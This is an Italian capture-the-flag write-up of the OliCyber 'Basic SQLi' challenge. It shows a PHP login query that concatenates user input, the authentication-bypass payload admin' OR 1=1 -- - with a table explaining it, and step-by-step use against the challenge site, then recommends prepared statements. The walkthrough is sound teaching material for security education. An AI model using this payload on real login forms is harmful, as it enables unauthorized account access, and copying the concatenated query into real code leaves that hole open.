# Basic SQLi

**Competizione:** OliCyber<br>
**Categoria:** Web / SQL Injection<br>
**URL:** http://basic-sqli.challs.olicyber.it

---

## Descrizione

> Ho costruito il mio primo sito PHP e ho inserito una flag nel mio account "admin", riesci a rubarla?

Un sito di login vulnerabile a SQL injection. L'obiettivo è bypassare l'autenticazione e ottenere accesso all'account admin.

---

## Soluzione

### Step 1 — Analisi del sito

Il sito presenta un semplice form di login con due campi:
- **Username**
- **Password**

La pagina suggerisce che la flag si trova nell'account admin.

---

### Step 2 — Identificazione della vulnerabilità

Il sito è vulnerabile a **SQL Injection**. La query PHP dietro il form di login è probabilmente qualcosa come:

```php
$query = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "' AND password = '" . $_POST['password'] . "'";
```

Se questa query viene eseguita senza sanitizzazione degli input, possiamo manipolarla inserendo caratteri speciali SQL.

---

### Step 3 — Craft del payload di SQL Injection

Per bypassare l'autenticazione e accedere all'account admin, utilizziamo il seguente payload nel campo username:

```
admin' OR 1=1 -- -
```

Analisi del payload:

| Parte | Funzione |
|---|---|
| `admin'` | Chiude la stringa e specifica l'username admin |
| `OR 1=1` | Aggiunge una condizione sempre vera |
| `-- -` | Commenta il resto della query (incluso il controllo della password) |

La query diventa:

```sql
SELECT * FROM users WHERE username = 'admin' OR 1=1 -- -' AND password = 'qualsiasi'
```

Che è equivalente a:

```sql
SELECT * FROM users WHERE username = 'admin' OR 1=1
```

Questa query restituisce sempre l'account admin, bypassando il controllo della password.

---

### Step 4 — Esecuzione dell'exploit

1. Visitare il sito: http://basic-sqli.challs.olicyber.it
2. Nel campo **Username**, inserire: `admin' OR 1=1 -- -`
3. Nel campo **Password**, inserire: qualsiasi valore (es. `password`)
4. Cliccare il pulsante "Sign in"

---

### Step 5 — Risultato

Dopo aver inviato il form con il payload di SQL Injection, la pagina mostra:

```
Hello Admin!
The flag is flag{...}
```

---

## Vulnerabilità sfruttata

| Aspetto | Dettaglio |
|---|---|
| **Tipo** | SQL Injection (SQLi) |
| **Causa** | Input non sanitizzato concatenato direttamente nella query SQL |
| **Vettore** | Parametri POST `username` e `password` |
| **Impatto** | Bypass dell'autenticazione, accesso non autorizzato |

---

## Conclusioni

- **Mai concatenare input utente direttamente in query SQL**: utilizzare sempre prepared statements
- Usare `$_POST` con placeholder e bind parameters (es. `?` o `:param`)
- In PHP con MySQLi: `$stmt = $mysqli->prepare("SELECT * FROM users WHERE username = ? AND password = ?");`
- In PHP con PDO: `$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username AND password = :password");`
- La sanitizzazione non è sufficiente, le prepared statements sono l'unico metodo sicuro
- Il commento SQL `--` è uno strumento potente per rimuovere parti di query